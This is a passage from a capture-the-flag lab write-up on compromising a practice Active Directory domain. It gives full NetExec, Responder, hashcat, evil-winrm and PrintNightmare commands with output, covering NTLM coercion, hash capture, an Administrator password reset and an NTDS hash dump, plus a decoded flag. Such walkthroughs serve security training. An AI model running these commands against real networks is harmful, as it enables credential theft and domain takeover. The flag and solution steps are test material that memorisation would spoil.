    shifted_text = ''.join(shift_char(c, -3) for c in decoded_text)
    return shifted_text[::-1]

if __name__ == "__main__":
    KEY = "fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=="
    print(f"The flag is: {decode_flag(KEY)}")
```

```bash
➜ python3 decode.py
The flag is: brb{c84b9cb01e49bdd12ad43f77317aa326}
```

Three reversible transforms, undone in reverse order: **base64 decode ➜ Caesar −3 (alpha mod 26, digits mod 10) ➜ reverse string**. The encryption direction was the mirror image: reverse, shift +3, encode.

## A.7 Tool Cheat Sheet

| Stage | Tool | Result on this target |
|-------|------|----------------------|
| Unpack | `pyinstxtractor-ng` | Clean extraction, no interpreter matching needed |
| Decompile | `pycdc` | Top-level structure + globals + `shift_char`; drops `with`/closure functions |
| Decompile | `pylingual.io` | Full source in one shot |
| Disassemble | `pycdas` | Ground truth; resolves control-flow questions decompilers disagree on |
| Dynamic | Procmon | Fastest path to the flag ([Section 2.3](#23-dynamic-analysis)) |

Rule of thumb: **decompile first, disassemble to verify, execute only if you must.** Decompilers are fast but lossy on new opcodes; the disassembly never lies; and dynamic analysis answers behavioural questions ("does the backdoor need the file?") that static reads can only suggest.

---

# Appendix B: PrintNightmare — Detours & Error Reference

The exploitation in [Section 6.3](#63-printnightmare) hit two distinct failures before landing via Invoke-Nightmare. Both error codes are worth keeping in a pocket reference, because they will come up again on any modern Windows target — and each tells you something different about *why* the exploit died. Before those, the appendix also records two attack leads that `enum_cve` and `coerce_plus` surfaced on SRV02 and where they dead-ended.

## B.0 The Detours — Relay & AD CS Leads

NetExec's enumeration modules flagged more than just PrintNightmare on SRV02:

```bash
➜ nxc smb srv02.gotham.city \
    -u harley.quinn -p 'SecretMyth123!' \
    -M coerce_plus
COERCE_PLUS 192.168.56.12      445    SRV02            VULNERABLE, PetitPotam
COERCE_PLUS 192.168.56.12      445    SRV02            VULNERABLE, PrinterBug
COERCE_PLUS 192.168.56.12      445    SRV02            VULNERABLE, MSEven

➜ nxc smb srv02.gotham.city \
    -u harley.quinn -p 'SecretMyth123!' \
    -M enum_cve
ENUM_CVE    192.168.56.12   445    SRV02            CVE-2025-33073 - NTLM reflection - can relay SMB to other protocols except SMB
ENUM_CVE    192.168.56.12   445    SRV02            CVE-2025-58726 - Ghost SPN - Relay possible from SMB using Ghost SPN (non HOST/CIFS) for Kerberos reflection to other protocols except SMB
ENUM_CVE    192.168.56.12   445    SRV02            CVE-2024-49019 - ESC15 / EKUwu - If host is an AD CS / CA server, it may be vulnerable to ESC15
ENUM_CVE    192.168.56.12   445    SRV02            CVE-2026-54121 - Certighost - If host is an AD CS / CA server, it may be vulnerable to Certighost
```

**Relay lead:** SMB signing is disabled on the member servers (recon flagged it), so coercing `SRV02$` into authenticating to us should yield its NTLMv2. `coerce_plus` drives the coercion; Responder catches it:

```bash
➜ responder -I ens33 -v

➜ nxc smb srv02.gotham.city \
    -u harley.quinn -p 'SecretMyth123!' \
    -M coerce_plus -o LISTENER=192.168.10.131 METHOD=Printerbug
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] GOTHAM.CITY\harley.quinn:SecretMyth123!
COERCE_PLUS 192.168.56.12   445    SRV02            VULNERABLE, PrinterBug
COERCE_PLUS 192.168.56.12   445    SRV02            Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx

[SMB] NTLMv2-SSP Client   : 192.168.56.12
[SMB] NTLMv2-SSP Username : GOTHAM\SRV02$
[SMB] NTLMv2-SSP Hash     : SRV02$::GOTHAM:256524206e5614ab:E346156237B6B9718366E0C1B6F55CE7:...

➜ hashcat -a 0 -m 5600 srv02.hash /opt/SecLists/rockyou.txt
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
```

Coercion works, capture works — but the machine account password isn't in rockyou, and without cracking the NTLMv2 there's no relay material. Dead end.

No LDAPS endpoint on either member server — nothing to attack. With both detours closed, PrintNightmare was the only live path left on SRV02.

## B.1 `0x8001011b` — RPC_E_ACCESS_DENIED (remote attempt)

> `[-] Exploit returned: RPRN SessionError: unknown error code: 0x8001011b`


```powershell
PS > certutil.exe -error 0x8001011b
0x8001011b (-2147417829 RPC_E_ACCESS_DENIED) -- 2147549467 (-2147417829)
Error message text: Access is denied.
```

| | |
|---|---|
| **Context** | Remote `RpcAddPrinterDriverEx` with the payload DLL on an attacker SMB share (`\\attacker\share\myth.dll`) |
| **Meaning** | The spooler refused to fetch/load the driver from a network path |
| **Root cause** | Post-2021 hardening (CVE-2021-34481 mitigations): Point-and-Print restrictions block driver installs from UNC paths unless the server is explicitly trusted |
| **What it proves** | The RPC call itself was accepted — auth and spooler access are fine; only the remote DLL location is blocked |
| **Next move** | Stage the DLL locally and retry (see B.2), or use the local LPE variant directly |

## B.2 `87` — ERROR_INVALID_PARAMETER (local PoC attempt)

```
PS C:\programdata> .\SharpPrintNightmare.exe \programdata\myth.dll
[*] Executing \programdata\myth.dll
[*] Try 1...
[*] Stage 0: 87
```

`87` is Win32's `ERROR_INVALID_PARAMETER`. Unlike B.1, this isn't a policy block — it means the API call itself is malformed as far as the patched OS is concerned:

| | |
|---|---|
| **Context** | Local execution of SharpPrintNightmare with the DLL staged at `\programdata\myth.dll` |
| **Meaning** | The `RpcAddPrinterDriverEx` call was rejected before policy even mattered |
| **Root cause** | Older PoCs build the DRIVER_INFO_2/DRIVER_PACKAGE structures in a way patched builds validate differently (e.g., pDriverPath/pConfigFile handling that pre-patch spoolers tolerated) |
| **What it proves** | Being local doesn't automatically fix things — the exploit *code* also needs to match the patched API surface |
| **Next move** | Use a maintained implementation — `Invoke-Nightmare` (CVE-2021-1675) constructs the call correctly for patched builds |

## B.3 Reading the pattern

Two failures, two completely different layers:

* `0x8001011b` = **policy layer**: "right call, wrong place" ➜ change where the DLL lives.
* `87` = **API layer**: "wrong call entirely" ➜ change the tool.

Diagnosing *which layer* rejected you is half the battle with any Windows exploit that has both remote and local variants. The error string (or `certutil -error`) tells you the first; comparing against a maintained tool tells you the second.

## B.4 Further Reading — How Bad Is It Really?

For depth beyond this lab: itm4n's follow-up post, [*The PrintNightmare is not Over Yet*](https://itm4n.github.io/printnightmare-not-over/) (Oct 2024), demonstrates that even the *hardened* Point-and-Print configurations — Package PnP with an approved-servers allow-list, UNC Hardened Access, RPC protocol restrictions — all fall to a combination of DNS spoofing and API hooking. His conclusion is blunt, and worth internalising: Microsoft's own KB states *"there is no combination of mitigations that is equivalent to setting RestrictDriverInstallationToAdministrators to 1"* — read literally, **you cannot secure Point and Print if low-privileged users can install drivers by any means**. For defenders, the only real options are pre-installing legacy driver packages or deploying them via GPO/scripts; for attackers, it means the `Data: 0` we saw in [Section 6.2](#62-privesc-recon--privesccheck)'s PrivescCheck output isn't just *a* misconfiguration — it's the whole ballgame.

---

# Appendix C: The Unintended Shortcut *(version drift bonus)*

![BloodHound - harvey.dent GenericAll over Backup Operators](/assets/images/barbhack24-gotham-bh-harvey-backupoperators.png)

> This path exploits the version-drift privilege flagged in [Section 8.1](#8-dc01-compromise). In the original CTF, `harvey.dent` could **not** touch the `Administrator` object — the Backup Operators chain above was the only designed route. In this build, the inherited `GenericAll` happens to cover the `Administrator` account too, so a direct password reset works. Shown for completeness — it collapses everything in Sections 8.2–8.3 into one command, but it's not the intended solution.

```bash
➜ nxc smb dc01.gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu," \
    -M change-password -o USER='administrator' NEWPASS='SecretMyth123!'
```

## C.1 Shell as Administrator

With the password reset, the domain Administrator account is ours in plaintext. WinRM straight onto the DC:

```bash
➜ evil-winrm -i dc01.gotham.city \
    -u administrator -p 'SecretMyth123!'

...[snip]...

PS C:\Users\Administrator\Documents> whoami; hostname
gotham\administrator
DC01
```

Domain Admin shell on the domain controller via the unintended path.

## C.2 Dumping Hashes

And since we're Domain Admin, the same post-exploitation is available here as everywhere else — no Backup Operator gymnastics needed, DRSUAPI is just allowed:

```bash
➜ nxc smb dc01.gotham.city \
    -u administrator -p 'SecretMyth123!' --ntds
```

Every domain hash including `krbtgt`, straight from NTDS.dit — the same end state as [Section 8.3](#83-dumping-the-dc-hives--backup_operator-module)'s Backup Operators route, reached without touching a single hive.

That's the full shortcut: one `GenericAll`, a password reset, a shell as Administrator, and the entire domain's credential database from there — three steps instead of the intended chain's five.

---

## Closing Thoughts

This lab is a love letter to NetExec, and honestly? It works. Nearly every stage of the chain — guest access, share discovery, RID brute forcing, AS-REP roasting, no-preauth Kerberoasting, protocol spraying, RDP execution, LSA dumping, gMSA resolution, password resets, group modification, hive backups, NTDS dumping — ran through a single tool with consistent syntax. That's exactly how the lab's creator intended it (the lab *is* the NetExec showcase), and there's real value in seeing how far one well-designed tool carries an internal engagement.

But it's worth being honest about what that convenience hides. The `winscp.reg` file is one of them:

**Deployment drift cuts both ways.** During the original CTF, there was no `.reg` file sitting at the root of `C:\` — players were meant to spot a WinSCP shortcut on the local administrator's desktop and go digging in the registry themselves. The automated deployments have their own quirks: some builds ship with `winscp.reg` left behind at `C:\` (which turns "notice the shortcut ➜ hunt for saved sessions" into "read a file that's literally named after the answer"), and neither build I've seen carries the original binary's `lucius.fox1337` hint — which is why RID brute forcing replaced it in this writeup. If you're redeploying an old CTF lab, expect drift like this: artefacts that give away steps the original design wanted you to earn, and hints that vanish entirely. Don't be surprised when your build doesn't match the writeups written against the original event.

Beyond that, the chain itself is a solid refresher of AD fundamentals: a misconfigured pre-auth flag turned one uncrackable account into a launchpad; a gMSA's whole reason for existing (no human knows the password) evaporates the moment its host machine is compromised; and Backup Operators remains one of the most under-rated paths to domain compromise — no fancy Kerberos attacks, just a backup privilege used as designed, pointed at the wrong target.

Thanks to [mpgn](https://x.com/mpgn_x64) for the BarbHack CTF, [Aleem Ladha](https://x.com/LadhaAleem) and [M4yFly](https://x.com/M4yFly) for turning it into a deployable lab, and the NetExec dev team for the tool the whole chain runs on. 🦇
